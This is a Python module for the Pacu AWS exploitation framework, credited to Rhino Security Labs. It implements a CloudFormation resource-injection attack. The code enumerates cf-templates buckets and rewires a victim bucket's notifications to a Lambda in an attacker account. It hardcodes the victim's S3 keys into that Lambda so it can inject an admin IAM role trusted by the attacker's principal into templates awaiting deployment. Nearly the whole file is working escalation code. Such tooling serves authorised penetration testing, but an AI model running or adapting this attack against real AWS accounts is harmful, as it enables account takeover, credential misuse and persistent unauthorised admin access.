#!/usr/bin/env python3
import argparse
import json
import os
import shutil
import subprocess
from pathlib import Path
from typing import TYPE_CHECKING, cast

import boto3
import botocore.exceptions
from botocore.exceptions import ClientError

from pacu import Main
from pacu.core.lib import module_data_dir, PacuException
from pacu.core.models import AWSKey


if TYPE_CHECKING:
    import mypy_boto3_s3
    import mypy_boto3_lambda

    from mypy_boto3_s3.type_defs import NotificationConfigurationTypeDef, \
        NotificationConfigurationResponseMetadataTypeDef

module_info = {
    'name': 'cfn__resource_injection',
    'author': 'Ryan Gerstenkorn of Rhino Security Labs',
    'category': 'ESCALATE',
    'one_liner': "Resource Injection in CloudFormation Templates",
    'description': '''
        Given an S3 bucket used for storing CloudFormation templates to be deployed this module will set up the S3 bucket
        notifications to trigger a lambda in another account when these templates are uploaded. This lambda will then
        inject an IAM admin role into the template, assuming this modification happens before the template is deployed,
        the user deploying is an admin, as well as deploys with the CAPABILITY_IAM permission (this more than likely
        the case) our IAM role will be deployed with the rest of the resources.

        Currently, it takes just under a second for templates to be updated so this module will be most effective
        against deployment processes that have some delay between the upload and deploy steps. The CloudFormation
        console wizard is a good target for this, however, there may be other cases that work here as well.
        
        After our IAM role is deployed it will have a trust role policy set up to allow AssumeRole from the IAM identity
        specified by the '--principal' argument, if this isn't specified the principal will be the root principal
        of the account used for the '--attacker-key' credentials.

        The '--*-key' arguments should reference Pacu credentials set up through 'set_keys'. There are a few separate
        credentials needed for this module, these are described below.

        This module is designed to make use of a secondary account where you have full access. This is where the
        lambda is deployed and it eliminates the need to have the permissions necessary in the target account to
        run lambda deploys. The credentials for this account should be specified with the '--attacker-key' argument.

        The '--s3-access-key' should have GetObject, PutObject, PutBucketNotification, and GetBucketNotification
        permissions to the targeted S3 bucket. This credential will be used to set up notifications on the targeted
        S3 bucket as well as hardcoded in the lambda during deployment and used to read and write templates when
        triggered.

        Optionally you can split the PutBucketNotification and GetBucketNotification permissions out into a separate
        key using '--s3-notifications-setup-key'. If this is not specified it's assumed that '--s3-access-key' has
        the necessary permissions.

        A specific bucket can be targeted with the '--bucket' argument. If this is not specified Pacu will attempt
        to enumerate 'cf-template-*' buckets and prompt for the target bucket.
    '''.strip(),
    'services': ['CloudFormation'],
    'prerequisite_modules': [],
    'external_dependencies': [],
    'arguments_to_autocomplete': [
        '--delete',
        '--attacker-key',
        '--s3-access-key',
        '--s3-notifications-setup-key',
        '--bucket',
    ],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--principal', help='''
    The principal to set in the injected roles trust policy. If the attack succeeds this user/role will be able to
    assume the newly created role which has admin privileges. Defaults to the root principal for the account used
    for the --attacker-key.

    Example: arn:aws:iam::123456789012:role/example.
'''.strip())

parser.add_argument('--delete', action='store_true', help='Delete an existing deployment.')
parser.add_argument('--attacker-key', required=True,
                    help='Pacu key name to use for the attacker account when deploying the lambda function.')
parser.add_argument('--s3-access-key', required=True,
                    help='Pacu key name to use for the deployed lambda function to access S3 in the victim account '
                         'account.')
parser.add_argument('--s3-notifications-setup-key',
                    help='Pacu key name to use for configuring the victims S3 buckets to send notifications to our '
                         'lambda function. If this is not specified the s3-access-key credentials will be used for '
                         'this instead.')
parser.add_argument('--bucket', help=' The S3 Bucket name to target, this is usually something like cf-templates-*.')

LAMBDA_NAME = "cfn__resource_injection_lambda-dev-update_template"


def get_bucket_name(s3: 'mypy_boto3_s3.ServiceResource', lambda_dir: 'Path') -> str:
    try:
        buckets = [b for b in s3.buckets.all() if b.name.startswith('cf-templates')]
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'AccessDenied':
            raise PacuException('Bucket discovery failed. If you know the S3 bucket you want to target specify the '
                                '`--bucket` argument when running this module.')
        else:
            raise e

    if not buckets:
        raise PacuException("No 'cf-templates-*' S3 buckets found.")

    print("Discovered S3 cf-template buckets:")
    for i, bucket in enumerate(buckets):
        if (lambda_dir/bucket.name/'.deployed').exists():
            print(f"{i}) {bucket.name} (deployed)")
        else:
            print(f"{i}) {bucket.name}")

    while True:
        selection = input("Select a S3 Bucket to target: ")
        try:
            return buckets[int(selection)].name
        except (ValueError, IndexError):
            print("Invalid selection")


def get_region(bucket, valid_regions) -> str:
    try:
        region = '-'.join(bucket.split('-')[-3:])
    except IndexError:
        region = None

    if region not in valid_regions:
        print('Could not determine the region from the bucket.')
        region = prompt(valid_regions, "Enter the region of the selected bucket: ")

    return region


def prompt(options, msg: str, opt_print_func=lambda o: o) -> str:
    for i, opt in enumerate(options):
        print(f"{i}) {opt_print_func(opt)}")

    while True:
        selection = input(msg)
        try:
            return options[int(selection)]
        except (ValueError, IndexError):
            print("Invalid selection")


def get_account_id(sess: 'boto3.Session'):
    return sess.client('sts').get_caller_identity()['Account']


# Main is the first function that is called when this module is executed.
def main(args, pacu_main: 'Main'):
    args = parser.parse_args(args)
    print = pacu_main.print

    # Default to using the s3_access_key if s3_notifications_setup_key is not provided.
    if args.s3_notifications_setup_key:
        s3_notifications_setup_key = args.s3_notifications_setup_key
    else:
        s3_notifications_setup_key = args.s3_access_key

    attacker_sess = get_session_from_key_name(pacu_main, args.attacker_key)
    account_id = get_account_id(attacker_sess)
    principal = args.principal or f"arn:aws:iam::{account_id}:root"
    if not principal:
        print("Must use the --principal argument to specify which user we want to be able to elevate permissions.")

    lambda_dir = (module_data_dir(pacu_main.running_module_names[-1])/'cfn__resource_injection_lambda')

    if args.bucket:
        bucket = args.bucket
    else:
        sess = get_aws_key_by_name(pacu_main, args.s3_access_key, 'us-east-1')
        bucket = get_bucket_name(sess.resource('s3'), lambda_dir)

    deploy_key: 'AWSKey' = pacu_main.get_aws_key_by_alias(args.attacker_key)
    if not deploy_key:
        print(f"Did not find the key {args.attacker_key} in pacu, make sure to set this with `set_keys` first.")

    env = lambda_env(pacu_main, bucket, deploy_key)

    deploy_dir = (lambda_dir / bucket)
    if args.delete:
        delete_lambda(deploy_dir, env)
    else:
        principal = principal
        s3_access_key: 'AWSKey' = pacu_main.get_aws_key_by_alias_from_db(args.s3_access_key)
        deploy_lambda(pacu_main, env, deploy_dir, bucket, principal, s3_access_key)

    region = get_region(bucket, pacu_main.get_regions('lambda'))
    s3_notifications_sess = get_aws_key_by_name(pacu_main, s3_notifications_setup_key, region)

    # No need to remove this on args.delete since we are deleting the lambda either way.
    if not args.delete:
        bucket_account = get_account_id(s3_notifications_sess)
        add_lambda_permission(attacker_sess, bucket_account, bucket, LAMBDA_NAME)

    if args.delete:
        remove_bucket_notification(s3_notifications_sess, bucket)
    else:
        lambda_account = get_account_id(attacker_sess)
        lambda_arn = f"arn:aws:lambda:{attacker_sess.region_name}:{lambda_account}:function:{LAMBDA_NAME}"
        put_bucket_notification(s3_notifications_sess, bucket, lambda_arn)

    if args.delete:
        msg = "Successfully deleted deployment."
    else:
        msg = f"""
Deployment successful.

After a modified CloudFormation template is successfully deployed in the target account there will be a new role
created with admin privileges that can be assumed from the '{principal}' principal.

This role name is randomly chosen by CloudFormation but will have 'MaintenanceRole' in the name. It is possible to
to explicitly set this name if needed however this is not supported at the moment.

"""
    return msg


def lambda_env(pacu: 'Main', bucket: str, key: 'AWSKey'):
    env = {
        "AWS_ACCESS_KEY_ID": key.access_key_id,
        "AWS_SECRET_ACCESS_KEY": key.secret_access_key,
        "PATH": os.environ["PATH"],
    }
    if key.session_token:
        env["AWS_SESSION_TOKEN"] = key.session_token
    env["AWS_DEFAULT_REGION"] = get_region(bucket, pacu.get_regions('lambda'))
    return env


def deploy_lambda(pacu: 'Main', env: dict, deploy_dir: Path, bucket: str, principal: str, s3_key: 'AWSKey'):
    print = pacu.print

    print(f"Will deploy lambda to {env['AWS_DEFAULT_REGION']}")
    if not deploy_dir.exists():
        shutil.copytree((Path(__file__).parent / 'cfn__resource_injection_lambda'), deploy_dir, dirs_exist_ok=False)

    config_path = deploy_dir / '.chalice' / 'config.json'
    config = json.loads(config_path.read_text())
    config['stages']['dev']['environment_variables']['PRINCIPAL'] = principal
    config['stages']['dev']['environment_variables']['BUCKET'] = bucket
    config['stages']['dev']['environment_variables']['S3_AWS_ACCESS_KEY_ID'] = s3_key.access_key_id
    config['stages']['dev']['environment_variables']['S3_AWS_SECRET_ACCESS_KEY'] = s3_key.secret_access_key
    if s3_key.session_token:
        config['stages']['dev']['environment_variables']['S3_AWS_SESSION_TOKEN'] = s3_key.session_token
    config_path.write_text(json.dumps(config))

    cmd = ['chalice', '--project-dir', str(deploy_dir), 'deploy']
    print(f"Running command: {' '.join(cmd)}")
    try:
        subprocess.check_call(cmd, env=env)
    except subprocess.CalledProcessError as e:
        # The deploy will fail when attempting to add the trigger to the cross account bucket because we're using the
        # keys for the attacker account. This is ok as long as the resource permissions get added to the deployed
        # lambda.
        if e.returncode == 2:
            pass
        else:
            raise e
    (deploy_dir / '.deployed').touch(exist_ok=True)


def delete_lambda(bucket_lambda_dir, env):
    if not bucket_lambda_dir.exists():
        raise UserWarning(f"The directory {str(bucket_lambda_dir)} does not exist.")
    subprocess.check_call(['chalice', '--project-dir', str(bucket_lambda_dir), 'delete'], env=env)
    shutil.rmtree(bucket_lambda_dir)


def get_session_from_key_name(pacu_main: 'Main', key_name: str, region: str = 'us-east-1'):
    key: 'AWSKey' = pacu_main.get_aws_key_by_alias(key_name)
    if not key:
        raise PacuException(f"Did not find the key {key_name} in pacu, make sure to set this with `set_keys` first.")

    return boto3.Session(
        region_name=region,
        aws_access_key_id=key.access_key_id,
        aws_secret_access_key=key.secret_access_key,
        aws_session_token=key.session_token,
    )


def get_aws_key_by_name(pacu_main: 'Main', key_name: str, region: str = 'us-east-1'):
    key: 'AWSKey' = pacu_main.get_aws_key_by_alias_from_db(key_name)
    if not key:
        raise PacuException(f"Did not find the key {key_name} in pacu, make sure to set this with `set_keys` first.")

    return boto3.Session(
        region_name=region,
        aws_access_key_id=key.access_key_id,
        aws_secret_access_key=key.secret_access_key,
        aws_session_token=key.session_token,
    )    


def put_bucket_notification(sess: 'boto3.Session', bucket: str, lambda_arn: str):
    s3 = sess.client('s3')
    resp = s3.get_bucket_notification_configuration(Bucket=bucket)
    conf = remove_our_notification(resp)
    conf.setdefault('LambdaFunctionConfigurations', []).append({
        'Id': 'cfn_notifications',
        'LambdaFunctionArn': lambda_arn,
        'Events': [
            's3:ObjectCreated:*',
        ],
    })
    try:
        s3.put_bucket_notification_configuration(
            Bucket=bucket,
            NotificationConfiguration=conf
        )
    except ClientError as e:
        if 'Cannot have overlapping suffixes' in e.response['Error']['Code']:
            raise PacuException(
                "\n\n*****\n"
                "There appears to already be a event configuration set up on this bucket with the same event type."
                "\n*****\n\n"
                "S3 only allows configuring a single notification configuration for each event type. It's possible "
                "that this was left around by a previous run of pacu, if this is the case you can try removing it and "
                "re-running this module.\n"
            )
        else:
            raise e


def remove_bucket_notification(sess: 'boto3.Session', bucket: str):
    s3 = sess.client('s3')
    resp = s3.get_bucket_notification_configuration(Bucket=bucket)
    resp = remove_our_notification(resp)

    s3.put_bucket_notification_configuration(
        Bucket=bucket,
        NotificationConfiguration=resp,
    )


def remove_our_notification(resp: 'NotificationConfigurationResponseMetadataTypeDef') -> \
        'NotificationConfigurationTypeDef':
    del resp['ResponseMetadata']
    resp = cast('NotificationConfigurationTypeDef', resp)
    for conf in resp.get('LambdaFunctionConfigurations', []):
        if conf['Id'] == 'cfn_notifications':
            resp['LambdaFunctionConfigurations'].remove(conf)
    return resp


def add_lambda_permission(sess, bucket_account, bucket, lambda_name):
    lambda_attacker = sess.client('lambda')
    try:
        lambda_attacker.add_permission(
            FunctionName=lambda_name,
            StatementId='cfn_notifications',
            Action='lambda:InvokeFunction',
            Principal='s3.amazonaws.com',
            SourceArn=f"arn:aws:s3:::{bucket}",
            SourceAccount=bucket_account,
        )
    except ClientError as e:
        if e.response['Error']['Code'] == 'ResourceConflictException':
            pass
        else:
            raise e


def remove_lambda_permission(sess: 'boto3.Session', lambda_name: str):
    lambda_attacker: 'mypy_boto3_lambda.Client' = sess.client('lambda')
    lambda_attacker.remove_permission(
        FunctionName=lambda_name,
        StatementId='cfn_notifications',
    )


def summary(data, pacu_main):
    return data

